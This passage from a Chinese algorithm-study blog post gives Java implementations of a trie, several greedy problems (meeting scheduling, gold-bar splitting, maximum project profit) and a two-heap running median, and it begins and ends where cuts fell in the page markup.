src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/zuoshen-algorithm/algorithm3_f2.png"></p><p>根节点的含义代表的就是空字符串</p></blockquote><p>前缀树具体有什么作用呢？</p><p>1）可以查询某个字符串被放进去多少次，只需要顺着<code>nexts</code>数组往下找，直到字符串结束，查看这个节点的<code>end</code>值即可，碰到<code>null</code>当然是没有这个字符串</p><p>2）可以查询以某个字符串为前缀的字符串有多少个，同理，顺着字符串直到结束，查看这个节点的<code>path</code>值即可</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> trieTree<span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">TrieNode</span> root<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">trieTree</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        root <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TrieNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">insert</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>str <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token class-name">TrieNode</span> node <span class="token operator">=</span> root<span class="token punctuation">;</span>        <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> chars <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> index<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">char</span> chr<span class="token operator">:</span>chars<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            index <span class="token operator">=</span> chr <span class="token operator">-</span> <span class="token string">'a'</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span>nexts<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> node<span class="token punctuation">.</span>nexts<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TrieNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            node<span class="token punctuation">.</span>path<span class="token operator">++</span><span class="token punctuation">;</span>            node <span class="token operator">=</span> node<span class="token punctuation">.</span>nexts<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        node<span class="token punctuation">.</span>path<span class="token operator">++</span><span class="token punctuation">;</span>        node<span class="token punctuation">.</span>end<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">delete</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">search</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">TrieNode</span> node <span class="token operator">=</span> root<span class="token punctuation">;</span>            <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> chars <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> index<span class="token punctuation">;</span>            node<span class="token punctuation">.</span>path<span class="token operator">--</span><span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">char</span> chr<span class="token operator">:</span>chars<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                index <span class="token operator">=</span> chr <span class="token operator">-</span> <span class="token string">'a'</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">--</span>node<span class="token punctuation">.</span>nexts<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">.</span>path <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    node<span class="token punctuation">.</span>nexts<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>                    <span class="token keyword">return</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                node <span class="token operator">=</span> node<span class="token punctuation">.</span>nexts<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            node<span class="token punctuation">.</span>end<span class="token operator">--</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">search</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>str <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token class-name">TrieNode</span> node <span class="token operator">=</span> root<span class="token punctuation">;</span>        <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> chars <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> index<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">char</span> chr<span class="token operator">:</span>chars<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            index <span class="token operator">=</span> chr <span class="token operator">-</span> <span class="token string">'a'</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span>nexts<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>            node <span class="token operator">=</span> node<span class="token punctuation">.</span>nexts<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> node<span class="token punctuation">.</span>end<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">countPrefix</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>str <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token class-name">TrieNode</span> node <span class="token operator">=</span> root<span class="token punctuation">;</span>        <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> chars <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> index<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">char</span> chr<span class="token operator">:</span>chars<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            index <span class="token operator">=</span> chr <span class="token operator">-</span> <span class="token string">'a'</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span>nexts<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>            node <span class="token operator">=</span> node<span class="token punctuation">.</span>nexts<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> node<span class="token punctuation">.</span>path<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="贪心算法"><a href="#贪心算法" class="headerlink" title="贪心算法"></a>贪心算法</h2><p>在某一个标准下，优先考虑最满足标准的样本，最后考虑最不满足标准的样本，最终得到一个答案的算法</p><blockquote><p>解题套路（对数器验证自己的贪心算法是否正确）：</p><ol><li>实现一个暴力绝对正确的方法X</li><li>使用对数器，去验证自己的贪心策略</li><li>不要去纠结贪心策略的证明</li></ol></blockquote><h3 id="0x01-安排会议"><a href="#0x01-安排会议" class="headerlink" title="0x01 安排会议"></a>0x01 安排会议</h3><p>一些项目要占用一个会议室宣讲，会议室不能同时容纳两个项目的宣讲。 给你每一个项目开始的时间和结束的时间(给你一个数组，里面是一个个具体的项目)，你来安排宣讲的日程，要求会议室进行的宣讲的场次最多， 返回这个最多的宣讲场次。</p><blockquote><p>贪心策略：优先选择结束时间最早的</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">Program</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> start<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> end<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Program</span><span class="token punctuation">(</span><span class="token keyword">int</span> start<span class="token punctuation">,</span> <span class="token keyword">int</span> end<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>start <span class="token operator">=</span> start<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>end <span class="token operator">=</span> end<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> programComparator <span class="token keyword">implements</span> <span class="token class-name">Comparator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Program</span><span class="token punctuation">></span></span><span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">compare</span><span class="token punctuation">(</span><span class="token class-name">Program</span> o1<span class="token punctuation">,</span> <span class="token class-name">Program</span> o2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> o1<span class="token punctuation">.</span>end <span class="token operator">-</span> o2<span class="token punctuation">.</span>end<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">bestArrange</span><span class="token punctuation">(</span><span class="token class-name">Program</span><span class="token punctuation">[</span><span class="token punctuation">]</span> programs<span class="token punctuation">,</span> <span class="token keyword">int</span> start<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span>programs<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token function">programComparator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Program</span> each<span class="token operator">:</span>programs<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>start<span class="token operator">&lt;=</span>each<span class="token punctuation">.</span>start<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            start <span class="token operator">=</span> each<span class="token punctuation">.</span>end<span class="token punctuation">;</span>            result<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x02-分金条"><a href="#0x02-分金条" class="headerlink" title="0x02 分金条"></a>0x02 分金条</h3><p>一块金条切成两半，是需要花费和长度数值一样的铜板的。比如长度为20的金条，不管切成长度多大的两半，都要花费20个铜板。 </p><p>一群人想整分整块金条，怎么分最省铜板? 例如,给定数组{10,20,30}，代表一共三个人，整块金条长度为10+20+30=60。 金条要分成10,20,30三个部分。 如果先把长度60的金条分成10和50，花费60； 再把长度50的金条分成20和30，花费50；一共花费110铜板。 但是如果先把长度60的金条分成30和30，花费60；再把长度30金条分成10和20， 花费30；一共花费90铜板。 </p><p>输入一个数组，返回分割的最小代价</p><blockquote><p>哈弗曼树思想，把数组放到小根堆中，每次用两个最小值，然后把和再次放入小根堆中，循环即可</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">lessMoney</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> pq <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> each<span class="token operator">:</span>arr<span class="token punctuation">)</span> pq<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>each<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> temp<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>pq<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">>=</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        temp <span class="token operator">=</span> pq<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> pq<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        sum <span class="token operator">+=</span> temp<span class="token punctuation">;</span>        pq<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> sum<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x03-项目最大收益"><a href="#0x03-项目最大收益" class="headerlink" title="0x03 项目最大收益"></a>0x03 项目最大收益</h3><p>输入：正数数组costs 正数数组profits 正数k 正数m</p><p>costs[i]表示i号项目的花费，profits[i]表示i号项目在扣除花费之后还能挣到的钱(利润)，k表示你只能串行的最多做k个项目，m表示你初始的资金</p><p>每做完一个项目，马上获得收益，可以支持你去做下一个项目</p><p>输出： 你最后获得的最大钱数</p><blockquote><p>小根堆用于存放按成本排列的项目，大根堆用于存放按利润排列的项目，每次从小根堆拿出基于目前已有的资金可以做的项目，放入大根堆中，然后拿出利润最大的一个，循环往复，直到做完k个项目或者拿不出可以做的项目而提前结束</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">Node</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> cost<span class="token punctuation">;</span>    <span class="token keyword">int</span> profit<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Node</span><span class="token punctuation">(</span><span class="token keyword">int</span> cost<span class="token punctuation">,</span> <span class="token keyword">int</span> profit<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>cost <span class="token operator">=</span> cost<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>profit <span class="token operator">=</span> profit<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> minCost <span class="token keyword">implements</span> <span class="token class-name">Comparator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span><span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">compare</span><span class="token punctuation">(</span><span class="token class-name">Node</span> o1<span class="token punctuation">,</span> <span class="token class-name">Node</span> o2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> o1<span class="token punctuation">.</span>cost <span class="token operator">-</span> o2<span class="token punctuation">.</span>cost<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> maxProfit <span class="token keyword">implements</span> <span class="token class-name">Comparator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span><span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">compare</span><span class="token punctuation">(</span><span class="token class-name">Node</span> o1<span class="token punctuation">,</span> <span class="token class-name">Node</span> o2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> o2<span class="token punctuation">.</span>profit <span class="token operator">-</span> o1<span class="token punctuation">.</span>profit<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">maxGain</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token punctuation">,</span> <span class="token keyword">int</span> m<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> costs<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> profits<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">Node</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nodes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Node</span><span class="token punctuation">[</span>costs<span class="token punctuation">.</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span> costs<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> nodes<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Node</span><span class="token punctuation">(</span>costs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> profits<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> pqCost <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token function">minCost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> pqProfit <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token function">maxProfit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Node</span> each<span class="token operator">:</span>nodes<span class="token punctuation">)</span> pqCost<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>each<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>k<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>pqCost<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> pqCost<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>cost <span class="token operator">&lt;=</span> m<span class="token punctuation">)</span> pqProfit<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>pqCost<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>pqProfit<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> m<span class="token punctuation">;</span>        m <span class="token operator">+=</span> pqProfit<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>profit<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> m<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x04-（不属于贪心）另一个大根堆小根堆结合的应用"><a href="#0x04-（不属于贪心）另一个大根堆小根堆结合的应用" class="headerlink" title="0x04 （不属于贪心）另一个大根堆小根堆结合的应用"></a>0x04 （不属于贪心）另一个大根堆小根堆结合的应用</h3><p>要求对给定数据流处理，随时可以取得中位数</p><p>第一个数进入大根堆，后面进来的数</p><p>1）&lt;= 大根堆顶，进入大根堆，否则进入小根堆</p><p>2）一旦大根堆和小根堆的size之差 =2，则将个数多的堆弹出放到另一个堆</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> medianHolder<span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> smallHeap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> bigHeap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token function">bigHeapComparator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">modifySize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> size1 <span class="token operator">=</span> smallHeap<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> size2 <span class="token operator">=</span> bigHeap<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">abs</span><span class="token punctuation">(</span>size1 <span class="token operator">-</span> size2<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>size1 <span class="token operator">></span> size2<span class="token punctuation">)</span> bigHeap<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>smallHeap<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> smallHeap<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>bigHeap<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">addNum</span><span class="token punctuation">(</span><span class="token keyword">int</span> num<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>bigHeap<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> num <span class="token operator">&lt;=</span> bigHeap<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> bigHeap<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> smallHeap<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">modifySize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">getMedian</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> size1 <span class="token operator">=</span> smallHeap<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> size2 <span class="token operator">=</span> bigHeap<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>size1 <span class="token operator">+</span> size2 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token class-name">Integer</span> head1 <span class="token operator">=</span> smallHeap<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Integer</span> head2 <span class="token operator">=</span> bigHeap<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size1 <span class="token operator">+</span> size2<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token punctuation">(</span>head1 <span class="token operator">+</span> head2<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>        <span class="token 